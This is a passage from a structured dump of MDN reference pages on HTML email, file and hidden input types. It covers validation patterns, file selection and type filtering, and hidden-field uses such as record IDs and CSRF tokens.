ensure that only text that matches the standard format for Internet email addresses is entered into the input box. Browsers use an algorithm equivalent to the following regular expression:\n\njs\n\n```\n/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;\n```\n\nTo learn more about how form validation works and how to take advantage of the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS properties to style the input based on whether the current value is valid, see [Form data validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation).\n\n**Note:** There are known specification issues related to international domain names and the validation of email addresses in HTML. See [W3C bug 15489](https://www.w3.org/Bugs/Public/show_bug.cgi?id=15489) for details.\n\n### Pattern validation\n\nIf you need the entered email address to be restricted further than just \"any string that looks like an email address,\" you can use the [`pattern`](../input#pattern) attribute to specify a [regular expression](https://developer.mozilla.org/en-US/docs/Glossary/Regular_expression) the value must match for it to be valid. If the [`multiple`](../input#multiple) attribute is specified, each individual item in the comma-delineated list of values must match the [regular expression](https://developer.mozilla.org/en-US/docs/Glossary/Regular_expression).\n\nFor example, let's say you're building a page for employees of Best Startup Ever, Inc. which will let them contact their IT department for help. In our simplified form, the user needs to enter their email address and a message describing the problem they need help with. We want to ensure that not only does the user provide a valid email address, but for security purposes, we require that the address be an internal corporate email address.\n\nSince inputs of type `email` validate against both the standard email address validation *and* the specified [`pattern`](../input#pattern), you can implement this easily. Let's see how:\n\nhtml\n\n```\n<form>\n  <div class=\"emailBox\">\n    <label for=\"emailAddress\">Your email address</label><br />\n    <input\n      id=\"emailAddress\"\n      type=\"email\"\n      size=\"64\"\n      maxlength=\"64\"\n      required\n      placeholder=\"username@beststartupever.com\"\n      pattern=\".+@beststartupever\\.com\"\n      title=\"Please provide only a Best Startup Ever corporate email address\" />\n  </div>\n\n  <div class=\"messageBox\">\n    <label for=\"message\">Request</label><br />\n    <textarea\n      id=\"message\"\n      cols=\"80\"\n      rows=\"8\"\n      required\n      placeholder=\"My shoes are too tight, and I have forgotten how to dance.\"></textarea>\n  </div>\n  <input type=\"submit\" value=\"Send Request\" />\n</form>\n```\n\nOur [`<form>`](../form) contains one [`<input>`](../input) of type `email` for the user's email address, a [`<textarea>`](../textarea) to enter their message for IT into, and an `<input>` of type [`\"submit\"`](submit), which creates a button to submit the form. Each text entry box has a [`<label>`](../label) associated with it to let the user know what's expected of them.\n\nLet's take a closer look at the email address entry box. Its [`size`](../input#size) and [`maxlength`](../input#maxlength) attributes are both set to 64 in order to show room for 64 characters worth of email address, and to limit the number of characters actually entered to a maximum of 64. The [`required`](../input#required) attribute is specified, making it mandatory that a valid email address be provided.\n\nAn appropriate [`placeholder`](../input#placeholder) is provided—`username@beststartupever.com`—to demonstrate what constitutes a valid entry. This string demonstrates both that an email address should be entered, and suggests that it should be a corporate beststartupever.com account. This is in addition to the fact that using type `email` will validate the text to ensure that it's formatted like an email address. If the text in the input box isn't an email address, you'll get an error message that looks something like this:\n\nIf we left things at that, we would at least be validating on legitimate email addresses. But we want to go one step farther: we want to make sure that the email address is in fact in the form `[username]@beststartupever.com`. This is where we'll use [`pattern`](../input#pattern). We set `pattern` to `.+@beststartupever.com`. This simple regular expression requests a string that consists of at least one character of any kind, then an \"@\" followed by the domain name \"beststartupever.com\".\n\nNote that this is not even close to an adequate filter for valid email addresses; it would allow things such as \" @beststartupever.com\" (note the leading space) or \"@@beststartupever.com\", neither of which is valid. However, the browser runs both the standard email address filter *and* our custom pattern against the specified text. As a result, we wind up with a validation which says \"make sure this resembles a valid email address, and if it is, make sure it's also a beststartupever.com address.\"\n\nIt's advisable to use the [`title`](../../global_attributes#title) attribute along with `pattern`. If you do, the `title` *must* describe the pattern. That is, it should explain what format the data should take on, rather than any other information. That's because the `title` may be displayed or spoken as part of a validation error message. For example, the browser might present the message \"The entered text doesn't match the required pattern.\" followed by your specified `title`. If your `title` is something like \"Email address\", the result would be the message \"The entered text doesn't match the required pattern. Email address\", which isn't very good.\n\nThat's why, instead, we specify the string \"Please provide only a Best Startup Ever corporate email address\" By doing that, the resulting full error message might be something like \"The entered text doesn't match the required pattern. Please provide only a Best Startup Ever corporate email address.\"\n\n**Note:** If you run into trouble while writing your validation regular expressions and they're not working properly, check your browser's console; there may be helpful error messages there to aid you in solving the problem.\n\n## Examples\n\nHere we have an email input with the ID `emailAddress` which is allowed to be up to a maximum of 256 characters long. The input box itself is physically 64 characters wide, and displays the text `user@example.gov` as a placeholder anytime the field is empty. In addition, by using the [`multiple`](../../attributes/multiple) attribute, the box is configured to allow the user to enter zero or more email addresses, separated by commas, as described in [Allowing multiple email addresses](#allowing_multiple_email_addresses). As a final touch, the [`list`](../input#list) attribute contains the ID of a [`<datalist>`](../datalist) whose [`<option>`](../option)s specify a set of suggested values the user can choose from.\n\nAs an added touch, the [`<label>`](../label) element is used to establish a label for the email entry box, with its [`for`](../label#for) attribute referencing the `emailAddress` ID of the [`<input>`](../input) element. By associating the two elements in this way, clicking on the label will focus the input element.\n\nhtml\n\n```\n<label for=\"emailAddress\">Email</label><br />\n<input\n  id=\"emailAddress\"\n  type=\"email\"\n  placeholder=\"user@example.gov\"\n  list=\"defaultEmails\"\n  size=\"64\"\n  maxlength=\"256\"\n  multiple />\n\n<datalist id=\"defaultEmails\">\n  <option value=\"jbond007@mi6.defence.gov.uk\"></option>\n  <option value=\"jbourne@unknown.net\"></option>\n  <option value=\"nfury@shield.org\"></option>\n  <option value=\"tony@starkindustries.com\"></option>\n  <option value=\"hulk@grrrrrrrr.arg\"></option>\n</datalist>\n```\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input)\n- [`<input type=\"tel\">`](tel)\n- [`<input type=\"url\">`](url)\n- Attributes:\n  - [`list`](../input#list)\n  - [`minlength`](../../attributes/minlength)\n  - [`maxlength`](../../attributes/maxlength)\n  - [`multiple`](../../attributes/multiple)\n  - [`pattern`](../../attributes/pattern)\n  - [`placeholder`](../input#placeholder)\n  - [`readonly`](../../attributes/readonly)\n  - [`size`](../../attributes/size)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/email](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/email)"
- name: input type="file"
  summary: <input> elements with type="file" let the user choose one or more files from their device storage
  description: "# \\<input type=\"file\"\\>\n\n[`<input>`](../input) elements with `type=\"file\"` let the user choose one or more files from their device storage. Once chosen, the files can be uploaded to a server using [form submission](https://developer.mozilla.org/en-US/docs/Learn/Forms), or manipulated using JavaScript code and [the File API](https://developer.mozilla.org/en-US/docs/Web/API/File_API/Using_files_from_web_applications).\n\n## Try it\n\n#### HTML Demo: \\<input type=\"file\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"avatar\">Choose a profile picture:</label>\n\n    <input type=\"file\" id=\"avatar\" name=\"avatar\" accept=\"image/png, image/jpeg\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\nA file input's [`value`](../input#value) attribute contains a string that represents the path to the selected file(s). If no file is selected yet, the value is an empty string (`\"\"`). When the user selected multiple files, the `value` represents the first file in the list of files they selected. The other files can be identified using the [input's `HTMLInputElement.files` property](https://developer.mozilla.org/en-US/docs/Web/API/File_API/Using_files_from_web_applications#getting_information_about_selected_files).\n\n**Note:** The value is [always the file's name prefixed with `C:\\fakepath\\`](https://html.spec.whatwg.org/multipage/input.html#fakepath-srsly), which isn't the real path of the file. This is to prevent malicious software from guessing the user's file structure.\n\n## Additional attributes\n\nIn addition to the common attributes shared by all [`<input>`](../input) elements, inputs of type `file` also support the following attributes.\n\n### accept\n\nThe [`accept`](../../attributes/accept) attribute value is a string that defines the file types the file input should accept. This string is a comma-separated list of **[unique file type specifiers](#unique_file_type_specifiers)**. Because a given file type may be identified in more than one manner, it's useful to provide a thorough set of type specifiers when you need files of a given format.\n\nFor instance, there are a number of ways Microsoft Word files can be identified, so a site that accepts Word files might use an `<input>` like this:\n\nhtml\n\n```\n<input\n  type=\"file\"\n  id=\"docpicker\"\n  accept=\".doc,.docx,.xml,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document\" />\n```\n\n### capture\n\nThe [`capture`](../../attributes/capture) attribute value is a string that specifies which camera to use for capture of image or video data, if the [`accept`](../../attributes/accept) attribute indicates that the input should be of one of those types. A value of `user` indicates that the user-facing camera and/or microphone should be used. A value of `environment` specifies that the outward-facing camera and/or microphone should be used. If this attribute is missing, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) is free to decide on its own what to do. If the requested facing mode isn't available, the user agent may fall back to its preferred default mode.\n\n**Note:** `capture` was previously a Boolean attribute which, if present, requested that the device's media capture device(s) such as camera or microphone be used instead of requesting a file input.\n\n### multiple\n\nWhen the [`multiple`](../../attributes/multiple) Boolean attribute is specified, the file input allows the user to select more than one file.\n\n## Non-standard attributes\n\nIn addition to the attributes listed above, the following non-standard attributes are available on some browsers. You should try to avoid using them when possible, since doing so will limit the ability of your code to function in browsers that don't implement them.\n\n### `webkitdirectory`\n\nThe Boolean `webkitdirectory` attribute, if present, indicates that only directories should be available to be selected by the user in the file picker interface. See [`HTMLInputElement.webkitdirectory`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/webkitdirectory) for additional details and examples.\n\nThough originally implemented only for WebKit-based browsers, `webkitdirectory` is also usable in Microsoft Edge as well as Firefox 50 and later. However, even though it has relatively broad support, it is still not standard and should not be used unless you have no alternative.\n\n## Unique file type specifiers\n\nA **unique file type specifier** is a string that describes a type of file that may be selected by the user in an [`<input>`](../input) element of type `file`. Each unique file type specifier may take one of the following forms:\n\n- A valid case-insensitive filename extension, starting with a period (\".\") character. For example: `.jpg`, `.pdf`, or `.doc`.\n- A valid MIME type string, with no extensions.\n- The string `audio/*` meaning \"any audio file\".\n- The string `video/*` meaning \"any video file\".\n- The string `image/*` meaning \"any image file\".\n\nThe `accept` attribute takes a string containing one or more of these unique file type specifiers as its value, separated by commas. For example, a file picker that needs content that can be presented as an image, including both standard image formats and PDF files, might look like this:\n\nhtml\n\n```\n<input type=\"file\" accept=\"image/*,.pdf\" />\n```\n\n## Using file inputs\n\n### A basic example\n\nhtml\n\n```\n<form method=\"post\" enctype=\"multipart/form-data\">\n  <div>\n    <label for=\"file\">Choose file to upload</label>\n    <input type=\"file\" id=\"file\" name=\"file\" multiple />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis produces the following output:\n\n**Note:** You can find this example on GitHub too — see the [source code](https://github.com/mdn/learning-area/blob/main/html/forms/file-examples/simple-file.html), and also [see it running live](https://mdn.github.io/learning-area/html/forms/file-examples/simple-file.html).\n\nRegardless of the user's device or operating system, the file input provides a button that opens up a file picker dialog that allows the user to choose a file.\n\nIncluding the [`multiple`](#multiple) attribute, as shown above, specifies that multiple files can be chosen at once. The user can choose multiple files from the file picker in any way that their chosen platform allows (e.g. by holding down Shift or Control and then clicking). If you only want the user to choose a single file per `<input>`, omit the `multiple` attribute.\n\n### Getting information on selected files\n\nThe selected files' are returned by the element's `HTMLInputElement.files` property, which is a [`FileList`](https://developer.mozilla.org/en-US/docs/Web/API/FileList) object containing a list of [`File`](https://developer.mozilla.org/en-US/docs/Web/API/File) objects. The `FileList` behaves like an array, so you can check its `length` property to get the number of selected files.\n\nEach `File` object contains the following information:\n\n[`name`](#name)  \nThe file's name.\n\n[`lastModified`](#lastmodified)  \nA number specifying the date and time at which the file was last modified, in milliseconds since the UNIX epoch (January 1, 1970, at midnight).\n\n[`lastModifiedDate`](#lastmodifieddate) Deprecated  \nA [`Date`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date) object representing the date and time at which the file was last modified. *This is deprecated and should not be used. Use `lastModified` instead.*\n\n[`size`](#size)  \nThe size of the file in bytes.\n\n[`type`](#type)  \nThe file's [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types).\n\n[`webkitRelativePath`](#webkitrelativepath) Non-standard  \nA string specifying the file's path relative to the base directory selected in a directory picker (that is, a `file` picker in which the [`webkitdirectory`](#webkitdirectory) attribute is set). *This is non-standard and should be used with caution.*\n\n**Note:** You can set as well as get the value of `HTMLInputElement.files` in all modern browsers; this was most recently added to Firefox, in version 57 (see [Firefox bug 1384030](https://bugzil.la/1384030)).\n\n### Limiting accepted file types\n\nOften you won't want the user to be able to pick any arbitrary type of file; instead, you often want them to select files of a specific type or types. For example, if your file input lets users upload a profile picture, you probably want them to select web-compatible image formats, such as [JPEG](https://developer.mozilla.org/en-US/docs/Glossary/JPEG) or [PNG](https://developer.mozilla.org/en-US/docs/Glossary/PNG).\n\nAcceptable file types can be specified with the [`accept`](#accept) attribute, which takes a comma-separated list of allowed file extensions or MIME types. Some examples:\n\n- `accept=\"image/png\"` or `accept=\".png\"` — Accepts PNG files.\n- `accept=\"image/png, image/jpeg\"` or `accept=\".png, .jpg, .jpeg\"` — Accept PNG or JPEG files.\n- `accept=\"image/*\"` — Accept any file with an `image/*` MIME type. (Many mobile devices also let the user take a picture with the camera when this is used.)\n- `accept=\".doc,.docx,.xml,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document\"` — accept anything that smells like an MS Word document.\n\nLet's look at a more complete example:\n\nhtml\n\n```\n<form method=\"post\" enctype=\"multipart/form-data\">\n  <div>\n    <label for=\"profile_pic\">Choose file to upload</label>\n    <input\n      type=\"file\"\n      id=\"profile_pic\"\n      name=\"profile_pic\"\n      accept=\".jpg, .jpeg, .png\" />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis produces a similar-looking output to the previous example:\n\n**Note:** You can find this example on GitHub too — see the [source code](https://github.com/mdn/learning-area/blob/main/html/forms/file-examples/file-with-accept.html), and also [see it running live](https://mdn.github.io/learning-area/html/forms/file-examples/file-with-accept.html).\n\nIt may look similar, but if you try selecting a file with this input, you'll see that the file picker only lets you select the file types specified in the `accept` value (the exact interface differs across browsers and operating systems).\n\nThe `accept` attribute doesn't validate the types of the selected files; it provides hints for browsers to guide users towards selecting the correct file types. It is still possible (in most cases) for users to toggle an option in the file chooser that makes it possible to override this and select any file they wish, and then choose incorrect file types.\n\nBecause of this, you should make sure that the `accept` attribute is backed up by appropriate server-side validation.\n\n### Detecting cancellations\n\nThe `cancel` event is fired when the user does not change their selection, reselecting the previously selected files. The `cancel` event is also fired when the file picker dialog gets closed, or canceled, via the \"cancel\" button or the escape key.\n\nFor example, the following code will log to the console if the user closes the popup without selecting a file:\n\njs\n\n```\nconst elem = document.createElement(\"input\");\nelem.type = \"file\";\nelem.addEventListener(\"cancel\", () => {\n  console.log(\"Cancelled.\");\n});\nelem.addEventListener(\"change\", () => {\n  if (elem.files.length == 1) {\n    console.log(\"File selected: \", elem.files[0]);\n  }\n});\nelem.click();\n```\n\n### Notes\n\n1.  You cannot set the value of a file picker from a script — doing something like the following has no effect:\n    js\n\n    ```\n    const input = document.querySelector(\"input[type=file]\");\n    input.value = \"foo\";\n    ```\n2.  When a file is chosen using an `<input type=\"file\">`, the real path to the source file is not shown in the input's `value` attribute for obvious security reasons. Instead, the filename is shown, with `C:\\fakepath\\` prepended to it. There are some historical reasons for this quirk, but it is supported across all modern browsers, and in fact is [defined in the spec](https://html.spec.whatwg.org/multipage/forms.html#fakepath-srsly).\n\n## Examples\n\nIn this example, we'll present a slightly more advanced file chooser that takes advantage of the file information available in the `HTMLInputElement.files` property, as well as showing off a few clever tricks.\n\n**Note:** You can see the complete source code for this example on GitHub — [file-example.html](https://github.com/mdn/learning-area/blob/main/html/forms/file-examples/file-example.html) ([see it live also](https://mdn.github.io/learning-area/html/forms/file-examples/file-example.html)). We won't explain the CSS; the JavaScript is the main focus.\n\nFirst of all, let's look at the HTML:\n\nhtml\n\n```\n<form method=\"post\" enctype=\"multipart/form-data\">\n  <div>\n    <label for=\"image_uploads\">Choose images to upload (PNG, JPG)</label>\n    <input\n      type=\"file\"\n      id=\"image_uploads\"\n      name=\"image_uploads\"\n      accept=\".jpg, .jpeg, .png\"\n      multiple />\n  </div>\n  <div class=\"preview\">\n    <p>No files currently selected for upload</p>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis is similar to what we've seen before — nothing special to comment on.\n\nNext, let's walk through the JavaScript.\n\nIn the first lines of script, we get references to the form input itself, and the [`<div>`](../div) element with the class of `.preview`. Next, we hide the [`<input>`](../input) element — we do this because file inputs tend to be ugly, difficult to style, and inconsistent in their design across browsers. You can activate the `input` element by clicking its [`<label>`](../label), so it is better to visually hide the `input` and style the label like a button, so the user will know to interact with it if they want to upload files.\n\njs\n\n```\nconst input = document.querySelector(\"input\");\nconst preview = document.querySelector(\".preview\");\n\ninput.style.opacity = 0;\n```\n\n**Note:** [`opacity`](https://developer.mozilla.org/en-US/docs/Web/CSS/opacity) is used to hide the file input instead of [`visibility: hidden`](https://developer.mozilla.org/en-US/docs/Web/CSS/visibility) or [`display: none`](https://developer.mozilla.org/en-US/docs/Web/CSS/display), because assistive technology interprets the latter two styles to mean the file input isn't interactive.\n\nNext, we add an [event listener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener) to the input to listen for changes to its selected value (in this case, when files are selected). The event listener invokes our custom `updateImageDisplay()` function.\n\njs\n\n```\ninput.addEventListener(\"change\", updateImageDisplay);\n```\n\nWhenever the `updateImageDisplay()` function is invoked, we:\n\n- Use a [`while`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/while) loop to empty the previous contents of the preview `<div>`.\n- Grab the [`FileList`](https://developer.mozilla.org/en-US/docs/Web/API/FileList) object that contains the information on all the selected files, and store it in a variable called `curFiles`.\n- Check to see if no files were selected, by checking if `curFiles.length` is equal to 0. If so, print a message into the preview `<div>` stating that no files have been selected.\n- If files *have* been selected, we loop through each one, printing information about it into the preview `<div>`. Things to note here:\n- We use the custom `validFileType()` function to check whether the file is of the correct type (e.g. the image types specified in the `accept` attribute).\n- If it is, we:\n  - Print out its name and file size into a list item inside the previous `<div>` (obtained from `file.name` and `file.size`). The custom `returnFileSize()` function returns a nicely-formatted version of the size in bytes/KB/MB (by default the browser reports the size in absolute bytes).\n  - Generate a thumbnail preview of the image by calling [`URL.createObjectURL(file)`](https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static). Then, insert the image into the list item too by creating a new [`<img>`](../img) and setting its [`src`](../img#src) to the thumbnail.\n- If the file type is invalid, we display a message inside a list item telling the user that they need to select a different file type.\n\njs\n\n```\nfunction updateImageDisplay() {\n  while (preview.firstChild) {\n    preview.removeChild(preview.firstChild);\n  }\n\n  const curFiles = input.files;\n  if (curFiles.length === 0) {\n    const para = document.createElement(\"p\");\n    para.textContent = \"No files currently selected for upload\";\n    preview.appendChild(para);\n  } else {\n    const list = document.createElement(\"ol\");\n    preview.appendChild(list);\n\n    for (const file of curFiles) {\n      const listItem = document.createElement(\"li\");\n      const para = document.createElement(\"p\");\n      if (validFileType(file)) {\n        para.textContent = `File name ${file.name}, file size ${returnFileSize(\n          file.size,\n        )}.`;\n        const image = document.createElement(\"img\");\n        image.src = URL.createObjectURL(file);\n        image.alt = image.title = file.name;\n\n        listItem.appendChild(image);\n        listItem.appendChild(para);\n      } else {\n        para.textContent = `File name ${file.name}: Not a valid file type. Update your selection.`;\n        listItem.appendChild(para);\n      }\n\n      list.appendChild(listItem);\n    }\n  }\n}\n```\n\nThe custom `validFileType()` function takes a [`File`](https://developer.mozilla.org/en-US/docs/Web/API/File) object as a parameter, then uses [`Array.prototype.includes()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes) to check if any value in the `fileTypes` matches the file's `type` property. If a match is found, the function returns `true`. If no match is found, it returns `false`.\n\njs\n\n```\n// https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types\nconst fileTypes = [\n  \"image/apng\",\n  \"image/bmp\",\n  \"image/gif\",\n  \"image/jpeg\",\n  \"image/pjpeg\",\n  \"image/png\",\n  \"image/svg+xml\",\n  \"image/tiff\",\n  \"image/webp\",\n  \"image/x-icon\",\n];\n\nfunction validFileType(file) {\n  return fileTypes.includes(file.type);\n}\n```\n\nThe `returnFileSize()` function takes a number (of bytes, taken from the current file's `size` property), and turns it into a nicely formatted size in bytes/KB/MB.\n\njs\n\n```\nfunction returnFileSize(number) {\n  if (number < 1e3) {\n    return `${number} bytes`;\n  } else if (number >= 1e3 && number < 1e6) {\n    return `${(number / 1e3).toFixed(1)} KB`;\n  } else {\n    return `${(number / 1e6).toFixed(1)} MB`;\n  }\n}\n```\n\n**Note:** The \"KB\" and \"MB\" units here use the [SI prefix](https://en.wikipedia.org/wiki/Binary_prefix) convention of 1KB = 1000B, similar to macOS. Different systems represent file sizes differently—for example, Ubuntu uses IEC prefixes where 1KiB = 1024B, while RAM specifications often use SI prefixes to represent powers of two (1KB = 1024B). For this reason, we used `1e3` (`1000`) and `1e6` (`100000`) instead of `1024` and `1048576`. In your application, you should communicate the unit system clearly to your users if the exact size is important.\n\nThe example looks like this; have a play:\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                  |\n|---------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing the path to the selected file.                                                                                                                                                                                                             |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event), [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) and [`cancel`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/cancel_event) |\n| **Supported common attributes** | [`required`](../input#required)                                                                                                                                                                                                                                  |\n| **Additional Attributes**       | [`accept`](#accept), [`capture`](#capture), [`multiple`](#multiple)                                                                                                                                                                                              |\n| **IDL attributes**              | `files` and `value`                                                                                                                                                                                                                                              |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                          |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select)                                                                                                                                                                           |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                              |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Using files from web applications](https://developer.mozilla.org/en-US/docs/Web/API/File_API/Using_files_from_web_applications) — contains a number of other useful examples related to `<input type=\"file\">` and the [File API](https://developer.mozilla.org/en-US/docs/Web/API/File).\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/file](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/file)"
- name: input type="hidden"
  summary: <input> elements of type hidden let web developers include data that cannot be seen or modified by users when a form is submitted
  description: "# \\<input type=\"hidden\"\\>\n\n[`<input>`](../input) elements of type `hidden` let web developers include data that cannot be seen or modified by users when a form is submitted. For example, the ID of the content that is currently being ordered or edited, or a unique security token. Hidden inputs are completely invisible in the rendered page, and there is no way to make it visible in the page's content.\n\n**Note:** The [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) and [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) events do not apply to this input type. Hidden inputs cannot be focused even using JavaScript (e.g. `hiddenInput.focus()`).\n\n## Value\n\nThe [`<input>`](../input) element's [`value`](../input#value) attribute holds a string that contains the hidden data you want to include when the form is submitted to the server. This specifically can't be edited or seen by the user via the user interface, although you could edit the value via browser developer tools.\n\n**Warning:** While the value isn't displayed to the user in the page's content, it is visible—and can be edited—using any browser's developer tools or \"View Source\" functionality. Do not rely on `hidden` inputs as a form of security.\n\n## Additional attributes\n\nIn addition to the attributes common to all [`<input>`](../input) elements, `hidden` inputs offer the following attributes.\n\n### name\n\nThis is actually one of the common attributes, but it has a special meaning available for hidden inputs. Normally, the [`name`](../input#name) attribute functions on hidden inputs just like on any other input. However, when the form is submitted, a hidden input whose `name` is set to `_charset_` will automatically be reported with the value set to the character encoding used to submit the form.\n\n## Using hidden inputs\n\nAs mentioned above, hidden inputs can be used anywhere that you want to include data the user can't see or edit along with the form when it's submitted to the server. Let's look at some examples that illustrate its use.\n\n### Tracking edited content\n\nOne of the most common uses for hidden inputs is to keep track of what database record needs to be updated when an edit form is submitted. A typical workflow looks like this:\n\n1.  User decides to edit some content they have control over, such as a blog post, or a product entry. They get started by pressing the edit button.\n2.  The content to be edited is taken from the database and loaded into an HTML form to allow the user to make changes.\n3.  After editing, the user submits the form, and the updated data is sent back to the server to be updated in the database.\n\nThe idea here is that during step 2, the ID of the record being updated is kept in a hidden input. When the form is submitted in step 3, the ID is automatically sent back to the server with the record content. The ID lets the site's server-side component know exactly which record needs to be updated with the submitted data.\n\nYou can see a full example of what this might look like in the [Examples](#examples) section below.\n\n### Improving website security\n\nHidden inputs are also used to store and submit security tokens or *secrets*, for the purposes of improving website security. The basic idea is that if a user is filling in a sensitive form, such as a form on their banking website to transfer some money to another account, the secret they would be provided with would prove that they are who they say they are, and that they are using the correct form to submit the transfer request.\n\nThis would stop a malicious user from creating a fake form, pretending to be a bank, and emailing the form to unsuspecting users to trick them into transferring money to the wrong place. This kind of attack is called a [Cross Site Request Forgery (CSRF)](https://developer.mozilla.org/en-US/docs/Learn/Server-side/First_steps/Website_security#cross-site_request_forgery_csrf); pretty much any reputable server-side framework uses hidden secrets to prevent such attacks.\n\n**Note:** Placing the secret in a hidden input doesn't inherently make it secure. The key's composition and encoding would do that. The value of the hidden input is that it keeps the secret associated with the data and automatically includes it when the form is sent to the server. You need to use well-designed secrets to actually secure your website.\n\n## Validation\n\nHidden inputs don't participate in constraint validation; they have no real value to be constrained.\n\n## Examples\n\nLet's look at how we might implement a simple version of the edit form we described earlier (see [Tracking edited content](#tracking_edited_content)), using a hidden input to remember the ID of the record being edited.\n\nThe edit form's HTML might look a bit like this:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"title\">Post title:</label>\n    <input type=\"text\" id=\"title\" name=\"title\" value=\"My excellent blog post\" />\n  </div>\n  <div>\n    <label for=\"content\">Post content:</label>\n    <textarea id=\"content\" name=\"content\" cols=\"60\" rows=\"5\">\nThis is the content of my excellent blog post. I hope you enjoy it!\n    </textarea>\n  </div>\n  <div>\n    <button type=\"submit\">Update post</button>\n  </div>\n  <input type=\"hidden\" id=\"postId\" name=\"postId\" value=\"34657\" />\n</form>\n```\n\nLet's also add some simple CSS:\n\ncss\n\n```\nhtml {\n  font-family: sans-serif;\n}\n\nform {\n  width: 500px;\n}\n\ndiv {\n  display: flex;\n  margin-bottom: 10px;\n}\n\nlabel {\n  flex: 2;\n  line-height: 2;\n  text-align: right;\n  padding-right: 20px;\n}\n\ninput,\ntextarea {\n  flex: 7;\n  font-family: sans-serif;\n  font-size: 1.1rem;\n  padding: 5px;\n}\n\ntextarea {\n  height: 60px;\n}\n```\n\nThe server would set the value of the hidden input with the ID \"`postID`\" to the ID of the post in its database before sending the form to the user's browser and would use that information when the form is returned to know which database record to update with modified information. No scripting is needed in the content to handle this.\n\nThe output looks like this:\n\n**Note:** You can also find the example on GitHub (see the [source code](https://github.com/mdn/learning-area/blob/main/html/forms/hidden-input-example/index.html), and also [see it running live](https://mdn.github.io/learning-area/html/forms/hidden-input-example/index.html)).\n\nWhen submitted, the form data sent to the server will look something like this:\n\n`title=My+excellent+blog+post&content=This+is+the+content+of+my+excellent+blog+post.+I+hope+you+enjoy+it!&postId=34657`\n\nEven though the hidden input cannot be seen at all, its data is still submitted.\n\n## Technical summary\n\n|                                 |                                                                                         |\n|---------------------------------|-----------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing the value of the hidden data you want to pass back to the server. |\n| **Events**                      | None.                                                                                   |\n| **Supported Common Attributes** | [`autocomplete`](../input#autocomplete)                                                 |\n| **IDL attributes**              | `value`                                                                                 |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) |\n| **Methods**                     | None.                                                                                   |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `hidden` | 1       | 12   | 1       | 2     | 1      | 18             | 4                   | 14            | 